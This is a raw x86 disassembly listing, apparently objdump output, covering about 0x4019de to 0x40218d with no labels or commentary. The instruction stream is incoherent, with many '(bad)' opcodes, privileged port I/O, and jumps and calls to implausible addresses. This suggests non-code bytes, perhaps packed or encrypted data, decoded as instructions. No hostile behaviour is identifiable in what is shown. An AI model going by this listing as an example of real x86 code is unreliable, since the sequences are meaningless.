  4019de:	mov    ah,BYTE PTR [ecx-0x4e]
  4019e1:	jle    0x401a11
  4019e3:	xlat   BYTE PTR ds:[ebx]
  4019e4:	sbb    DWORD PTR [edx+ebx*8+0x59dccb22],ebp
  4019eb:	adc    DWORD PTR [ecx],ebp
  4019ed:	std    
  4019ee:	rcr    BYTE PTR [esi],1
  4019f0:	in     eax,0xcc
  4019f2:	out    dx,al
  4019f3:	sbb    al,0x91
  4019f5:	fldcw  WORD PTR [ecx+0x12]
  4019f8:	bound  ebp,QWORD PTR [esi]
  4019fa:	fsubr  DWORD PTR [ebp+ebx*2-0x7d]
  4019fe:	sti    
  4019ff:	(bad)  
  401a01:	mov    ch,0xd7
  401a03:	cmp    ah,BYTE PTR [ecx]
  401a05:	shl    DWORD PTR [edi+ecx*2],cl
  401a08:	push   eax
  401a09:	out    0x82,al
  401a0b:	data16 mov cl,0x58
  401a0e:	mov    esi,0x4e4d0410
  401a13:	sahf   
  401a14:	push   ebp
  401a15:	lods   al,BYTE PTR ds:[esi]
  401a16:	mov    eax,0x96beca4
  401a1b:	in     al,dx
  401a1c:	and    eax,0xf5aecc5
  401a21:	ror    DWORD PTR [eax+0x6d],cl
  401a24:	hlt    
  401a25:	aad    0x9e
  401a27:	shl    BYTE PTR ds:0xc53084eb,0xe3
  401a2e:	mov    edx,0x31fcf1a2
  401a33:	rcr    BYTE PTR [eax],0xea
  401a36:	test   DWORD PTR [ecx],0x455a9310
  401a3c:	xchg   esp,eax
  401a3d:	jecxz  0x401a28
  401a3f:	push   esp
  401a40:	fwait
  401a41:	push   edx
  401a42:	xchg   esp,eax
  401a43:	push   0x7d02037d
  401a48:	push   ecx
  401a49:	icebp  
  401a4a:	cmp    BYTE PTR [ebp+0x4e],ah
  401a4d:	out    dx,al
  401a4e:	adc    cl,BYTE PTR [ebx+0x72]
  401a51:	fst    st(5)
  401a53:	dec    edx
  401a54:	xlat   BYTE PTR ds:[ebx]
  401a55:	cmp    DWORD PTR [edx+0x2f3b27db],0xffffff9a
  401a5c:	mov    ecx,0xa63341e5
  401a61:	bound  ecx,QWORD PTR [eax+0x59]
  401a64:	and    eax,DWORD PTR [ebx]
  401a66:	sti    
  401a67:	loop   0x4019fa
  401a69:	mov    edi,0x63aa7c83
  401a6e:	xor    DWORD PTR [edi],esi
  401a70:	fld    QWORD PTR [eax+edx*8]
  401a73:	push   0x16
  401a75:	out    0xd7,eax
  401a77:	and    dl,BYTE PTR [ecx+0x3d3aa78d]
  401a7d:	xor    BYTE PTR [eax+edx*1-0x30fabec3],cl
  401a84:	sbb    ah,BYTE PTR [edx+0x1f]
  401a87:	and    al,0x6c
  401a89:	jo     0x401a49
  401a8b:	and    ebx,DWORD PTR [ecx+0x319243fb]
  401a91:	mov    dl,0xdd
  401a93:	add    BYTE PTR [ebp+0x20e3644],dl
  401a99:	cmp    ecx,DWORD PTR [eax-0xa]
  401a9c:	ds out 0xcd,eax
  401a9f:	sbb    al,0x95
  401aa1:	mov    eax,ds:0x6897e99b
  401aa6:	stos   DWORD PTR es:[edi],eax
  401aa7:	fs mov ebp,0xb732b314
  401aad:	inc    di
  401aaf:	aam    0xbc
  401ab1:	xor    cl,dh
  401ab3:	scas   eax,DWORD PTR es:[edi]
  401ab4:	lahf   
  401ab5:	stos   BYTE PTR es:[edi],al
  401ab6:	push   0xffffff92
  401ab8:	(bad)  
  401ab9:	xchg   ebp,eax
  401aba:	push   esi
  401abb:	mov    bh,0x3
  401abd:	inc    ecx
  401abe:	adc    ah,ah
  401ac0:	dec    ebp
  401ac1:	push   edi
  401ac2:	xchg   DWORD PTR [edx+0x36],esi
  401ac5:	mov    al,ds:0x970951c3
  401aca:	inc    eax
  401acb:	dec    eax
  401acc:	(bad)  
  401acd:	rol    DWORD PTR [eax],1
  401acf:	sar    DWORD PTR [edi-0x19696800],0xcc
  401ad6:	cmp    BYTE PTR [ecx],0x14
  401ad9:	inc    esp
  401ada:	jne    0x401a76
  401adc:	popa   
  401add:	in     eax,dx
  401ade:	call   FWORD PTR [edx]
  401ae0:	sbb    al,0x28
  401ae2:	andnps xmm2,xmm6
  401ae5:	xchg   DWORD PTR [edi],ebp
  401ae7:	xchg   edx,eax
  401ae8:	call   0xeda6888a
  401aed:	sub    DWORD PTR [ebp-0x51ce120c],ebx
  401af3:	test   eax,0xb8da705
  401af8:	and    eax,0x1b216d6e
  401afd:	aam    0x77
  401aff:	and    dh,BYTE PTR [ebx]
  401b01:	and    ch,BYTE PTR ds:0x1711f2ce
  401b07:	sbb    eax,0xbbdbfb5b
  401b0c:	outs   dx,DWORD PTR ss:[esi]
  401b0e:	sbb    ah,BYTE PTR [esi+0xcad0915]
  401b14:	scas   eax,DWORD PTR es:[edi]
  401b15:	test   al,0x2b
  401b17:	retf   0x79c5
  401b1a:	sbb    DWORD PTR [ebx],esi
  401b1c:	jae    0x401b46
  401b1e:	fs mov esp,0x437c1b68
  401b24:	xchg   DWORD PTR [esi],eax
  401b26:	gs adc al,bh
  401b29:	xchg   esp,eax
  401b2a:	out    dx,eax
  401b2b:	adc    eax,0x153fb8f0
  401b30:	jmp    0x91aa085d
  401b35:	mov    eax,ds:0x41e18909
  401b3a:	pop    ebx
  401b3b:	adc    al,BYTE PTR ss:[ebx-0x2b370c75]
  401b42:	pop    ebx
  401b43:	lods   al,BYTE PTR ds:[esi]
  401b44:	test   eax,esp
  401b46:	cmp    eax,0xfd3f63e2
  401b4b:	or     bh,BYTE PTR [eax+0x62]
  401b4e:	cld    
  401b4f:	sbb    BYTE PTR [si-0x3782],cl
  401b54:	mov    bh,0x9c
  401b57:	mov    ch,0xf7
  401b59:	cmp    ebp,DWORD PTR [edi+0x16]
  401b5c:	sub    DWORD PTR [ebx],0x532a3ee6
  401b62:	and    dl,dh
  401b64:	rcl    DWORD PTR [ebp+0x250f0ab1],0xb3
  401b6b:	shr    cl,cl
  401b6d:	addr16 and al,dl
  401b70:	stos   BYTE PTR es:[edi],al
  401b71:	and    bl,ah
  401b73:	inc    eax
  401b74:	xchg   edi,eax
  401b75:	mov    bh,BYTE PTR [eax]
  401b77:	leave  
  401b78:	gs addr16 pop ebx
  401b7b:	addr16 mov al,ds:0x5994
  401b7f:	mov    dh,0x1d
  401b81:	cdq    
  401b82:	loop   0x401b65
  401b84:	mov    al,cl
  401b86:	inc    ebp
  401b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b88:	push   eax
  401b89:	ret    
  401b8a:	add    cl,BYTE PTR [ecx]
  401b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b8d:	scas   eax,DWORD PTR es:[edi]
  401b8e:	add    DWORD PTR [ebx+0x529d3d0f],ecx
  401b94:	mov    ch,0x7
  401b96:	data16 out dx,al
  401b98:	mov    ah,0x22
  401b9a:	dec    edx
  401b9b:	and    al,0xa8
  401b9d:	jmp    0xe6d54098
  401ba2:	call   0x9e67:0xf163a734
  401ba9:	aad    0x72
  401bab:	out    0x3f,al
  401bad:	rcl    BYTE PTR [eax],1
  401baf:	sbb    DWORD PTR [esi+ecx*1+0x70d49417],0xffffffe7
  401bb7:	fild   QWORD PTR [ecx-0x4c391367]
  401bbd:	inc    ebx
  401bbe:	hlt    
  401bbf:	push   cs
  401bc0:	es out dx,al
  401bc2:	push   ds
  401bc3:	mov    DWORD PTR [ecx-0x3f],esi
  401bc6:	cld    
  401bc7:	cmp    al,0x72
  401bc9:	shr    BYTE PTR [edx-0x4],0x0
  401bcd:	push   ecx
  401bce:	jae    0x401c29
  401bd0:	sub    DWORD PTR ds:0x5e3be04e,edi
  401bd6:	int3   
  401bd7:	mov    eax,0xbd26bc4f
  401bdc:	xchg   BYTE PTR [eax+ebx*4],bh
  401bdf:	inc    ebp
  401be0:	pop    edi
  401be1:	or     BYTE PTR [edi-0x38],ah
  401be4:	jns    0x401c5a
  401be6:	std    
  401be7:	add    DWORD PTR [ecx-0x25],esp
  401bea:	xchg   edx,ebx
  401bec:	clc    
  401bed:	mov    dh,0x38
  401bef:	mov    ecx,0xc6d17bfa
  401bf4:	iret   
  401bf5:	mov    esp,0x62e6ac8e
  401bfa:	mov    ebx,0x38193722
  401bff:	jo     0x401bf4
  401c01:	mov    al,ds:0x62444424
  401c06:	pusha  
  401c07:	test   BYTE PTR [ebp+0x5ac6e025],bh
  401c0d:	or     eax,0x503387f2
  401c12:	and    bl,ah
  401c14:	and    DWORD PTR [esi],0xf2591b9e
  401c1a:	icebp  
  401c1b:	loopne 0x401bdb
  401c1d:	xor    ebx,DWORD PTR [edi+0x2d]
  401c20:	in     al,dx
  401c21:	mov    al,ds:0x884ea6b0
  401c26:	lock fisttp WORD PTR [edi+0xc]
  401c2a:	divps  xmm7,XMMWORD PTR [edi]
  401c2d:	daa    
  401c2e:	pop    ebp
  401c2f:	push   edi
  401c30:	or     BYTE PTR [ecx+0x5],bh
  401c33:	add    ebp,DWORD PTR [edx+0x2c]
  401c36:	lahf   
  401c37:	mov    ?,edx
  401c39:	scas   al,BYTE PTR es:[edi]
  401c3a:	mov    bl,BYTE PTR [ebx-0x55521184]
  401c40:	mov    BYTE PTR gs:[ecx+0x21b5fe68],bh
  401c47:	jbe    0x401ca0
  401c49:	out    0x62,al
  401c4b:	in     eax,0x53
  401c4d:	sbb    eax,0x72e1d7b9
  401c52:	in     eax,dx
  401c53:	(bad)
  401c56:	leave  
  401c57:	mov    BYTE PTR [ecx+0x18ff722],ah
  401c5d:	pushf  
  401c5e:	mov    ds:0xcbc3258b,eax
  401c63:	or     al,0x36
  401c65:	retf   0x246e
  401c68:	rcr    DWORD PTR [ebp+0x5f],1
  401c6b:	mov    bl,0x6
  401c6d:	out    dx,eax
  401c6e:	adc    BYTE PTR [eax],ah
  401c70:	daa    
  401c71:	imul   esi,ebx,0x1b
  401c74:	retf   0x3e2b
  401c77:	push   ebx
  401c78:	call   0x419117f
  401c7d:	mov    dh,0xbb
  401c7f:	or     DWORD PTR [ebx],0x7904ce52
  401c85:	outs   dx,BYTE PTR ds:[esi]
  401c86:	sub    al,0x3e
  401c88:	(bad)  
  401c89:	lods   eax,DWORD PTR ds:[esi]
  401c8a:	and    ebx,DWORD PTR [esi]
  401c8c:	xor    al,0xbd
  401c8e:	mov    cl,BYTE PTR [esi-0x3f]
  401c91:	retf   
  401c92:	scas   eax,DWORD PTR es:[edi]
  401c93:	add    eax,0xc5b44412
  401c98:	out    0xe3,al
  401c9a:	(bad)  
  401c9b:	retf   0xfe0d
  401c9e:	int3   
  401c9f:	sub    al,BYTE PTR [edx+0x13]
  401ca2:	jne    0x401d05
  401ca4:	test   DWORD PTR [ecx],0x99bfc363
  401caa:	push   eax
  401cab:	inc    ebp
  401cac:	mov    ds:0x11d14b2f,eax
  401cb1:	pop    ecx
  401cb2:	test   eax,0x2ac9a38c
  401cb7:	rol    ah,cl
  401cb9:	mov    ebp,0x7a8fbf3d
  401cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cbf:	lea    edi,[eax]
  401cc1:	mov    al,0xce
  401cc3:	in     eax,0x7d
  401cc5:	ret    
  401cc6:	scas   eax,DWORD PTR es:[edi]
  401cc7:	ret    0x6395
  401cca:	nop
  401ccb:	(bad)  
  401ccc:	loop   0x401cab
  401cce:	sub    BYTE PTR [ebp+0x70],bh
  401cd1:	repnz adc ah,BYTE PTR [edx+edx*2-0x1b]
  401cd6:	cwde   
  401cd7:	iret   
  401cd8:	mov    bh,0x70
  401cda:	and    ah,BYTE PTR [edx-0x55]
  401cdd:	push   ebp
  401cde:	adc    DWORD PTR [esi+edx*2+0x1],0x1b335bc3
  401ce6:	sahf   
  401ce7:	retf   
  401ce8:	xor    BYTE PTR [edx-0x54fea977],al
  401cee:	jmp    0xa9b9abc2
  401cf3:	test   BYTE PTR [ebx-0x69],bl
  401cf6:	pop    ebp
  401cf7:	loopne 0x401cdd
  401cf9:	xchg   ecx,eax
  401cfa:	mov    ecx,0x988c5f25
  401cff:	inc    eax
  401d00:	scas   eax,DWORD PTR es:[edi]
  401d01:	and    esi,0x848c65cc
  401d07:	sub    ch,0x8e
  401d0a:	shl    DWORD PTR [ecx],1
  401d0c:	mov    dl,0xb8
  401d0e:	mov    al,0xef
  401d10:	cmc    
  401d11:	cmc    
  401d12:	or     ebx,eax
  401d14:	shr    BYTE PTR ds:0x9f942e6f,0x8c
  401d1b:	jl     0x401d5a
  401d1d:	js     0x401d05
  401d1f:	sbb    eax,0x1e3f9f15
  401d24:	fdivrp st(6),st
  401d26:	imul   eax,DWORD PTR [edi-0x7b64bfea],0x68
  401d2d:	mov    al,ds:0xef94b740
  401d32:	push   0x33
  401d34:	jo     0x401d7c
  401d36:	in     eax,0x71
  401d38:	pop    esi
  401d39:	mov    bh,0x4a
  401d3b:	xor    DWORD PTR [edx+0x43],eax
  401d3e:	sub    cl,BYTE PTR ds:0x416dd1fa
  401d44:	cld    
  401d45:	adc    edi,DWORD PTR [eax]
  401d47:	rcl    BYTE PTR [ebx+esi*1+0x6d],0x79
  401d4c:	cmp    ah,BYTE PTR [eax-0x686a74c]
  401d52:	scas   eax,DWORD PTR es:[edi]
  401d53:	sub    eax,0x5502e5bb
  401d58:	jg     0x401dcc
  401d5a:	xor    BYTE PTR [bx],0xd7
  401d5e:	inc    edi
  401d5f:	or     eax,0xce290816
  401d64:	out    dx,eax
  401d65:	adc    al,0xbe
  401d67:	xchg   esp,eax
  401d68:	outs   dx,DWORD PTR ds:[esi]
  401d69:	dec    ebp
  401d6a:	pop    edx
  401d6b:	(bad)  [esi-0x5e084551]
  401d71:	inc    edx
  401d72:	cmp    BYTE PTR [esi+0x26],bh
  401d75:	ror    DWORD PTR [edi],cl
  401d77:	jno    0x401d78
  401d79:	loopne 0x401dee
  401d7b:	and    eax,edx
  401d7d:	mov    ebx,0xd2910924
  401d82:	into   
  401d83:	push   cs
  401d84:	retf   
  401d85:	and    eax,0xed356e6c
  401d8a:	fsubr  st(7),st
  401d8c:	fucompp 
  401d8e:	dec    ebp
  401d8f:	xcrypt-cbc (bad)
  401d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d91:	push   edx
  401d92:	sub    BYTE PTR [esi-0x4aae5c49],0x5d
  401d99:	xchg   ebp,eax
  401d9a:	jnp    0x401d6e
  401d9c:	ins    BYTE PTR es:[edi],dx
  401d9d:	sub    BYTE PTR [edi+eiz*4],ah
  401da0:	or     eax,0x4de91618
  401da5:	outs   dx,BYTE PTR ds:[esi]
  401da6:	adc    dl,BYTE PTR [edi+0x17]
  401da9:	xor    al,0x27
  401dab:	cdq    
  401dac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dad:	mov    edx,0x53b1d1d7
  401db2:	std    
  401db3:	cmp    BYTE PTR [ecx-0x31467280],ah
  401db9:	out    0x15,al
  401dbb:	jecxz  0x401d9f
  401dbd:	jo     0x401d57
  401dbf:	fwait
  401dc0:	in     al,dx
  401dc1:	add    al,0x62
  401dc3:	(bad)  [eax+edi*4-0x748f7f48]
  401dca:	mov    eax,0x2226bcb9
  401dcf:	stos   BYTE PTR es:[edi],al
  401dd0:	rcl    DWORD PTR [ecx],0x18
  401dd3:	pop    es
  401dd4:	cmp    al,0xc
  401dd6:	push   0xcca0b3c1
  401ddb:	ja     0x401db3
  401ddd:	pop    edx
  401dde:	adc    eax,0x5d86a923
  401de3:	jl     0x401dd2
  401de5:	jmp    FWORD PTR [edi-0x3f71cc7]
  401deb:	mov    bl,BYTE PTR [edx]
  401ded:	push   ss
  401dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401def:	cdq    
  401df0:	(bad)  
  401df1:	jmp    0x401d7e
  401df3:	imul   edx,DWORD PTR [esi],0x1f39de3b
  401df9:	adc    esi,DWORD PTR [edx]
  401dfb:	call   FWORD PTR [ebx+edx*2]
  401dfe:	aad    0x21
  401e00:	inc    ecx
  401e01:	jnp    0x401d90
  401e03:	jmp    0x401e6c
  401e05:	xchg   ebp,eax
  401e06:	jmp    0xf512:0x2610f5de
  401e0d:	cmp    al,BYTE PTR [eax+0x26]
  401e10:	jnp    0x401e42
  401e12:	shl    DWORD PTR [esi],cl
  401e14:	ror    DWORD PTR [ebx+0x584225e8],cl
  401e1a:	pop    ds
  401e1b:	adc    al,0x9c
  401e1d:	xor    esi,ecx
  401e1f:	ja     0x401ddc
  401e21:	mov    bh,dh
  401e23:	push   esp
  401e24:	or     ah,al
  401e26:	div    ebx
  401e28:	lahf   
  401e29:	inc    ecx
  401e2a:	xchg   esp,eax
  401e2b:	ins    BYTE PTR es:[edi],dx
  401e2c:	(bad)  
  401e2d:	arpl   WORD PTR [ebx],dx
  401e2f:	outs   dx,DWORD PTR ds:[esi]
  401e30:	mov    bh,0xc0
  401e32:	push   0x1c031893
  401e37:	sbb    eax,0x55a7b767
  401e3c:	add    al,0xb7
  401e3e:	and    al,0x5b
  401e40:	sar    DWORD PTR [edx],1
  401e42:	or     eax,DWORD PTR [eax+edx*4+0x1bc13fbf]
  401e49:	mov    eax,ecx
  401e4b:	imul   esi,DWORD PTR [eax-0x7b9c29df],0xffffffb0
  401e52:	fmul   QWORD PTR [ebx]
  401e54:	mov    ds:0x96b90d1f,eax
  401e59:	cmp    eax,0x640a5e98
  401e5e:	mov    esp,DWORD PTR [ecx+0x9]
  401e61:	cdq    
  401e62:	adc    al,0xbb
  401e64:	push   0x37927c1b
  401e69:	hlt    
  401e6a:	sub    ebx,DWORD PTR [edi]
  401e6c:	xchg   edi,eax
  401e6d:	cmp    eax,0x45b18593
  401e72:	xor    eax,0xff9f21ef
  401e77:	ins    DWORD PTR es:[edi],dx
  401e78:	pop    esp
  401e79:	add    al,BYTE PTR [eax+0x4cdd1335]
  401e7f:	push   ds
  401e80:	add    BYTE PTR [ebp-0x5af5abe7],bh
  401e86:	and    dl,bh
  401e88:	enter  0xe62a,0x96
  401e8c:	gs push ss
  401e8e:	push   ebx
  401e8f:	mov    esi,0xe0d9233f
  401e94:	mov    al,ds:0x62930f11
  401e99:	fcomp  QWORD PTR [eax]
  401e9b:	xchg   esp,eax
  401e9c:	xor    esi,DWORD PTR [ebx]
  401e9e:	ins    BYTE PTR es:[edi],dx
  401e9f:	fwait
  401ea0:	gs clc 
  401ea2:	cmp    ebp,DWORD PTR [esi]
  401ea4:	mov    ecx,0x10978c70
  401ea9:	jmp    0x401e71
  401eab:	mov    ds:0xee0afa37,al
  401eb0:	cmp    dh,dl
  401eb2:	cwde   
  401eb3:	pushf  
  401eb4:	stos   DWORD PTR es:[edi],eax
  401eb5:	(bad)  
  401eb6:	mov    bh,0xf1
  401eb8:	ins    DWORD PTR es:[edi],dx
  401eb9:	adc    ah,BYTE PTR [eax]
  401ebb:	arpl   WORD PTR [ebx-0x17],cx
  401ebe:	mov    ds:0xd94bd157,al
  401ec3:	push   0x56
  401ec5:	(bad)  
  401ec6:	out    0x9d,eax
  401ec8:	mov    gs,WORD PTR [ecx]
  401eca:	adc    eax,0x4971da26
  401ecf:	(bad)  
  401ed0:	jmp    0xb129792b
  401ed5:	jns    0x401e81
  401ed7:	ja     0x401ec3
  401ed9:	std    
  401eda:	(bad)  
  401edb:	cmp    ecx,DWORD PTR [ebx-0x5e0a05]
  401ee1:	inc    esi
  401ee2:	sbb    ebx,DWORD PTR [eax-0x576ae768]
  401ee8:	mov    eax,ds:0xae945dc9
  401eed:	jne    0x401f47
  401eef:	call   0xfc87:0x263bcc27
  401ef6:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ef8:	iret   
  401ef9:	push   edx
  401efa:	add    al,0x6a
  401efc:	retf   
  401efd:	pop    ds
  401efe:	shr    al,cl
  401f00:	jp     0x401ee9
  401f02:	cs pop esi
  401f04:	pop    esi
  401f05:	dec    eax
  401f06:	push   0xffffffd9
  401f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f09:	xchg   ebp,eax
  401f0a:	sar    BYTE PTR [ebp+0x12],cl
  401f0d:	mov    al,0xad
  401f0f:	inc    ebx
  401f10:	pop    eax
  401f11:	call   0x4a7469ea
  401f16:	push   cs
  401f17:	sti    
  401f18:	ror    DWORD PTR [ebp+0x24500f03],0xf0
  401f1f:	push   0x7f
  401f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f22:	cmp    edx,DWORD PTR [ecx+0x0]
  401f25:	xchg   ebx,eax
  401f26:	gs push esp
  401f28:	add    DWORD PTR [ecx],0xffffff9a
  401f2b:	inc    ebx
  401f2c:	push   cs
  401f2d:	jo     0x401f62
  401f2f:	adc    BYTE PTR [edi],ah
  401f31:	or     BYTE PTR [esi+0x4e6e17fa],bh
  401f37:	mov    esp,0x32d4b705
  401f3c:	xor    ebp,esi
  401f3e:	add    esp,DWORD PTR [esi-0xf]
  401f41:	inc    ecx
  401f42:	push   ds
  401f43:	mov    ch,0x85
  401f45:	and    bl,dl
  401f47:	out    dx,al
  401f48:	push   eax
  401f49:	mov    ds,WORD PTR [esi]
  401f4b:	stc    
  401f4c:	dec    eax
  401f4d:	dec    esi
  401f4e:	in     al,dx
  401f4f:	mov    dh,BYTE PTR [esi+edx*8-0x760b206c]
  401f56:	stc    
  401f57:	and    al,0x3a
  401f59:	mov    bl,0xca
  401f5b:	mul    ebx
  401f5d:	adc    eax,0xec9a6635
  401f62:	pmaxub mm4,mm4
  401f65:	add    BYTE PTR [esi+0x79],dh
  401f68:	pop    ss
  401f69:	pop    ss
  401f6a:	scas   al,BYTE PTR es:[edi]
  401f6b:	test   DWORD PTR [eax-0x5b5bf565],esp
  401f71:	xchg   ebp,eax
  401f72:	mov    ds,WORD PTR [ebp+0x4e91c2dd]
  401f78:	mov    DWORD PTR [ebp-0x2d],edi
  401f7b:	push   ss
  401f7c:	sbb    BYTE PTR [edi-0x6ea5ea5b],ah
  401f82:	mov    dl,0x81
  401f84:	fwait
  401f85:	aam    0xc7
  401f87:	js     0x401ffb
  401f89:	push   0xd
  401f8b:	mov    bl,0x3f
  401f8d:	push   ebx
  401f8e:	xchg   edi,eax
  401f8f:	(bad)  
  401f90:	test   dh,0xaa
  401f93:	mov    eax,ds:0xf14443b6
  401f98:	clc    
  401f99:	call   0x9c4818ac
  401f9e:	test   eax,0x2408bcec
  401fa3:	xor    edx,DWORD PTR [edi]
  401fa5:	inc    ecx
  401fa6:	loop   0x401fdd
  401fa8:	pop    ss
  401fa9:	ret    
  401faa:	push   ss
  401fab:	stc    
  401fac:	adc    BYTE PTR [ebp+0x34],al
  401faf:	imul   eax,ebp,0xf72c464
  401fb5:	push   0x2603d23
  401fba:	mov    cs,WORD PTR [edx-0x6223f5db]
  401fc0:	int    0x8a
  401fc2:	inc    bh
  401fc4:	(bad)  
  401fc5:	test   BYTE PTR [edi],0xe1
  401fc8:	pop    eax
  401fc9:	push   ebp
  401fca:	pop    ss
  401fcb:	(bad)  
  401fcc:	jmp    0x8dc4:0x29229575
  401fd3:	idiv   BYTE PTR [ecx]
  401fd5:	add    ah,dl
  401fd7:	lods   al,BYTE PTR ds:[esi]
  401fd8:	mov    cl,0x7d
  401fda:	sbb    al,BYTE PTR [ecx]
  401fdc:	out    0x4,eax
  401fde:	gs (bad) 
  401fe0:	jne    0x401f6e
  401fe2:	add    DWORD PTR [eax],ebx
  401fe4:	mov    edi,0xe6f008e9
  401fe9:	pop    es
  401fea:	mov    ebp,0x24cef140
  401fef:	xchg   ecx,eax
  401ff0:	loope  0x401fc2
  401ff2:	inc    edx
  401ff3:	out    dx,al
  401ff4:	xchg   esp,eax
  401ff5:	retf   0xdd92
  401ff8:	je     0x401fc7
  401ffa:	ja     0x401fc3
  401ffc:	jns    0x40205e
  401ffe:	nop
  401fff:	mov    DWORD PTR [ebx],ecx
  402001:	mov    bh,0x41
  402003:	inc    ebp
  402004:	sbb    al,0xa7
  402006:	xchg   edx,eax
  402007:	push   cs
  402008:	inc    esi
  402009:	in     eax,dx
  40200a:	xchg   edx,eax
  40200b:	push   eax
  40200c:	(bad)  
  40200d:	lock retf 0x137b
  402011:	inc    BYTE PTR [esi]
  402013:	aam    0x5a
  402015:	arpl   WORD PTR [ecx+0xe],si
  402018:	fs loopne 0x402066
  40201b:	or     al,0xe
  40201d:	xchg   esp,eax
  40201e:	std    
  40201f:	xchg   DWORD PTR [ebx+0x51],esp
  402022:	in     al,dx
  402023:	dec    eax
  402024:	jo     0x402095
  402026:	loopne 0x402058
  402028:	dec    ecx
  402029:	sub    DWORD PTR [ecx+0xb],ecx
  40202c:	lock mov ds:0xa2768d8c,al
  402032:	pusha  
  402033:	cld    
  402034:	mov    ?,WORD PTR [edx+0x1f834595]
  40203a:	sahf   
  40203b:	pop    eax
  40203c:	leave  
  40203d:	psrld  mm6,QWORD PTR [eax]
  402040:	mov    bh,0x3f
  402042:	sbb    bl,dh
  402044:	xor    eax,0x9acf1fdb
  402049:	mov    bl,0xcb
  40204b:	mov    ds:0xfebbe673,eax
  402050:	and    BYTE PTR [eax+ecx*4],0xd3
  402054:	cwde   
  402055:	push   cs
  402056:	idiv   BYTE PTR gs:[ebx]
  402059:	(bad)  
  40205a:	fcom   QWORD PTR [edx-0x751ff82f]
  402060:	inc    ebp
  402061:	jbe    0x40206c
  402063:	jbe    0x4020a3
  402065:	jno    0x40206c
  402067:	add    al,0x86
  402069:	sbb    edx,ebp
  40206b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40206c:	or     ebx,esp
  40206e:	(bad)  
  40206f:	les    eax,FWORD PTR [ecx-0x70b23b1a]
  402075:	iret   
  402076:	pop    ds
  402077:	pop    eax
  402078:	add    al,0xe4
  40207a:	(bad)  
  40207c:	mov    ah,0x47
  40207e:	mov    ebx,ecx
  402080:	out    dx,al
  402081:	ficom  DWORD PTR [ebp+0x1e3356cf]
  402087:	jmp    0xe541e90f
  40208c:	jmp    eax
  40208e:	pusha  
  40208f:	push   0x98f28b2b
  402094:	(bad)  [ebx-0x347e4e16]
  40209a:	arpl   WORD PTR [esi+0x4059e276],bp
  4020a0:	dec    eax
  4020a1:	add    ch,ch
  4020a3:	xor    eax,DWORD PTR [esi+ebx*8+0x4a]
  4020a7:	fidivr WORD PTR [eax-0x51]
  4020aa:	cmp    al,0x5a
  4020ac:	and    eax,0x7e4ad70d
  4020b1:	loopne 0x4020ab
  4020b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020b4:	mov    edx,0xe51dab3c
  4020b9:	es gs jne 0x4020d9
  4020bd:	aam    0xe7
  4020bf:	push   edx
  4020c0:	outs   dx,BYTE PTR ds:[esi]
  4020c1:	loop   0x4020f5
  4020c3:	push   ebx
  4020c4:	pusha  
  4020c5:	dec    edx
  4020c6:	int    0x85
  4020c8:	xlat   BYTE PTR ds:[ebx]
  4020c9:	xor    BYTE PTR gs:[ecx+0x1b],dl
  4020cd:	xor    eax,0xc7569cb
  4020d2:	or     bl,bl
  4020d4:	repz jns 0x4020d7
  4020d7:	mov    bl,0xbc
  4020d9:	push   ss
  4020da:	dec    ebx
  4020db:	add    al,BYTE PTR [esi]
  4020dd:	jnp    0x402084
  4020df:	aaa    
  4020e0:	dec    esi
  4020e1:	add    esp,DWORD PTR [ecx+0x2abe4cc3]
  4020e7:	push   edx
  4020e8:	lods   al,BYTE PTR ds:[esi]
  4020e9:	mov    al,0xb3
  4020eb:	mov    bl,0x84
  4020ed:	mov    dl,0x44
  4020ef:	xor    BYTE PTR [eax+0x3f],al
  4020f2:	mov    bl,al
  4020f4:	sbb    eax,0xa3a80468
  4020f9:	arpl   WORD PTR [edx],si
  4020fb:	mov    ah,ch
  4020fd:	mov    cl,0xec
  4020ff:	jle    0x402173
  402101:	push   ds
  402102:	push   0x1d
  402104:	inc    esp
  402105:	outs   dx,DWORD PTR ds:[esi]
  402106:	or     al,0x7c
  402108:	test   al,0xa4
  40210a:	hlt    
  40210b:	test   DWORD PTR [esi],ecx
  40210d:	mov    DWORD PTR ds:0x290d07e1,esi
  402113:	xor    edi,eax
  402115:	push   esi
  402116:	rcl    DWORD PTR [eax+0xd6e6b32],0x57
  40211d:	and    DWORD PTR [ecx-0x2a],ecx
  402120:	mov    ch,0xcb
  402122:	sti    
  402123:	inc    ebx
  402124:	jp     0x4020f6
  402126:	repnz add eax,0xc47f0192
  40212c:	cmp    eax,0xea5d9f0c
  402131:	and    eax,0x4e29eca1
  402136:	jl     0x402183
  402138:	lods   eax,DWORD PTR ds:[esi]
  402139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40213a:	stc    
  40213b:	jge    0x402138
  40213d:	and    eax,0x8184a41f
  402142:	mov    ch,0x37
  402144:	outs   dx,BYTE PTR ds:[esi]
  402145:	call   0xf948:0x342efb8d
  40214c:	scas   eax,DWORD PTR es:[edi]
  40214d:	pop    eax
  40214e:	popf   
  40214f:	scas   eax,DWORD PTR es:[edi]
  402150:	jg     0x40216c
  402152:	imul   edi
  402154:	pop    ss
  402155:	(bad)  
  402159:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40215b:	pusha  
  40215c:	lock cmc 
  40215e:	pop    esp
  40215f:	cmp    eax,0x20368fde
  402164:	jb     0x402142
  402166:	(bad)  
  402167:	mov    edi,0x7e680841
  40216c:	jg     0x40210b
  40216e:	or     eax,0x4f979bf4
  402173:	jl     0x40219c
  402175:	rol    DWORD PTR [esi],0xc8
  402178:	fnsave [eax-0x5e]
  40217b:	mov    dh,BYTE PTR ds:0x8e118f51
  402181:	in     eax,0xaf
  402183:	int3   
  402184:	cwde   
  402185:	cmp    al,0x9b
  402187:	(bad)  
  402188:	xchg   esi,eax
  402189:	arpl   WORD PTR [ecx-0xc],di
  40218c:	pop    edx
  40218d:	jbe    0x40219c
